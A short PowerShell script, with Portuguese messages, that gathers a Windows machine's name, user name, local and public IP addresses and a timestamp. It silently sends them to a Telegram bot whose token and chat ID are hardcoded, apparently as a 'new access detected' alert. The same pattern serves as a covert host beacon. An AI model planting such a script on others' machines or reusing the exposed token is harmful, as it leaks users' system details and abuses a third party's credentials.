    $botToken = "8411844431:AAGY8clGQEvQ7VN3FX1nOy_8eQhtY0GTAh8"
    $chatId = "-5246184320"

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $timestamp = Get-Date -Format "dd/MM/yyyy HH:mm:ss"

    try {
        $localIPs = Get-CimInstance Win32_NetworkAdapterConfiguration |
            Where-Object { $_.IPEnabled -eq $true } |
            ForEach-Object { $_.IPAddress } |
            Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' -and $_ -ne '127.0.0.1' } |
            Select-Object -Unique
        $localIpAddress = ($localIPs -join ', ')
        if ([string]::IsNullOrWhiteSpace($localIpAddress)) { $localIpAddress = "Nao obtido" }
    } catch { $localIpAddress = "Erro" }

    try {
        $publicIpAddress = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).ToString().Trim()
    } catch { $publicIpAddress = "Nao obtido" }

    $message = "NOVO ACESSO DETECTADO`n`nComputador: $computerName`nUsuario: $userName`nIP Local: $localIpAddress`nIP Publico: $publicIpAddress`nData/Hora: $timestamp"

    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$([System.Web.HttpUtility]::UrlEncode($message))"

    try {
        Invoke-RestMethod -Uri $url -Method Get | Out-Null
    } catch { }
